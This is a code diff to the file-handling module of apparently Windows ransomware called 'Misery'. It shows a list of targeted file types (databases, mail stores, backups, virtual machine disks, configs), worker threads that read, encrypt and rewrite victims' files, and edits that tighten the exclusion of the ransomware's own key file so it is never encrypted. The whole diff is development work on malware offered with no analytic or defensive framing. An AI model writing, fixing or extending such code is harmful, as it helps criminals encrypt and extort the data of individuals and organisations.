@@ -28,7 +28,7 @@ static const char *g_ext[] = {
     ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
     ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
     ".pst",".ost",".eml",".msg",".mbox",
-    ".key",".pem",".cer",".crt",".pfx",".p12",
+    ".pem",".cer",".crt",".pfx",".p12",
     ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
     ".bak",".old",".backup",".bkp",".dmp",".dump",
     ".cfg",".config",".conf",".ini",".inf",
@@ -115,11 +115,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         DWORD  fs = 0;
         bool   success = false;
 
-        /* ── Belt-and-suspenders: Skip misery.key even if it slipped through traverse ── */
+        /* ── FIX: Stronger key file exclusion — use strstr to catch at ANY path depth ── */
         if (!decryptMode) {
-            const char *fname = strrchr(narrowPath, '\\');
-            if (!fname) fname = narrowPath; else fname++;
-            if (_stricmp(fname, "misery.key") == 0) {
+            if (strstr(narrowPath, "misery.key") != NULL) {
                 MiseryLog(MISERY_LOG_INFO, "FileOps: Worker skipping key file: %s", narrowPath);
                 success = true;
                 EnterCriticalSection(&ctx->statsLock);
@@ -173,18 +171,17 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (!ReadFile(hFile, buf, fs, &rd, NULL) || rd != fs) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                           narrowPath, GetLastError());
-                goto worker_done;  /* buf will be freed in worker_done cleanup */
+                goto worker_done;
             }
             CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
 
-            /* Allocate output buffer for plaintext */
             DWORD maxPlainCap = fs;
             plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!plaintext) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           maxPlainCap, GetLastError());
-                goto worker_done;  /* buf + plaintext both cleaned up in worker_done */
+                goto worker_done;
             }
 
             DWORD decLen = 0;
@@ -247,7 +244,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             }
 
             /* Delete the .encrypted file */
-            DeleteFileA(narrowPath);  /* best-effort; non-fatal if fails */
+            DeleteFileA(narrowPath);
 
             success = true;
             MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) → %s",
@@ -275,14 +272,14 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (!plaintext) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                           fs, GetLastError());
-                goto worker_done;  /* buf cleaned up in worker_done */
+                goto worker_done;
             }
 
             DWORD rd = 0;
             if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                           narrowPath, GetLastError());
-                goto worker_done;  /* buf + plaintext cleaned up in worker_done */
+                goto worker_done;
             }
             CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
 
@@ -299,7 +296,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (cerr != CRYPTO_SUCCESS) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                           narrowPath, GetErrorString(cerr), cerr);
-                goto worker_done;  /* buf cleaned up in worker_done; plaintext already NULL */
+                goto worker_done;
             }
 
             /* Write encrypted data to .tmp */
@@ -312,7 +309,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             if (hWrite == INVALID_HANDLE_VALUE) {
                 MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
                           tmpPath, GetLastError());
-                goto worker_done;  /* buf cleaned up in worker_done */
+                goto worker_done;
             }
             DWORD wr = 0;
             BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
@@ -367,9 +364,6 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             buf = NULL;
         }
         if (plaintext) {
-            /* plaintext was allocated with size fs in encrypt path,
-             * or with size maxPlainCap (= original fs) in decrypt path.
-             * Zeroing fs bytes covers whichever path was taken. */
             SecureZeroMemory(plaintext, fs > 0 ? fs : 4096);
             VirtualFree(plaintext, 0, MEM_RELEASE);
             plaintext = NULL;
@@ -464,16 +458,11 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
                 EnqueueFile(ctx, full);
 
             } else {
-                
-
-                /* CRITICAL: Never encrypt misery.key */
-
-                 const char *fname = strrchr(narrow, '\\');
-                 if (!fname) fname = narrow; else fname++;
-                 if (_stricmp(fname, "misery.key") == 0) {
-                     MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
-                      continue;
-                 }
+                /* ── FIX: Use strstr to catch misery.key at ANY path depth ── */
+                if (strstr(narrow, "misery.key") != NULL) {
+                    MiseryLog(MISERY_LOG_INFO, "FileOps: Skipping key file: %s", narrow);
+                    continue;
+                }
 
                 if (!IsTargetExtension(narrow)) continue;
 
@@ -620,8 +609,13 @@ bool FileOps_DefaultShouldSkip(const WCHAR* path) {
     return false;
 }
 
+/* ── FIX: Hard-exclude misery.key at the extension check level ── */
 static bool IsTargetExtension(const char* path) {
     if (!path) return false;
+
+    /* FIX: Never encrypt the key file, regardless of where it sits */
+    if (strstr(path, "misery.key") != NULL) return false;
+
     const char *dot = strrchr(path, '.');
     if (!dot) return false;
     for (int i = 0; g_ext[i]; i++) {
